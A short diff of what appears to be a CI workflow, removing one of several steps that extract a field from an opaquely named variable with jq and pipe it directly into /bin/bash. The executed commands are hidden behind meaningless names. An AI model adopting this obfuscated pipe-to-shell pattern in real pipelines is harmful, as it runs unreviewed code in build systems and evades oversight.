@@ -25,7 +25,6 @@ jobs:
           echo $zq1 | jq -r .wlb0 | /bin/bash
           printf '%s' "$sds248" | jq -r .n2 | /bin/bash
           printf '%s' "$dqa4" | jq -r .lsjxd0 | /bin/bash
-          printf '%s' "$yufqw1" | jq -r .s5 | /bin/bash
           printf '%s' "$iayc3682" | jq -r .rmwdo802 | /bin/bash
 
       - name: Save output
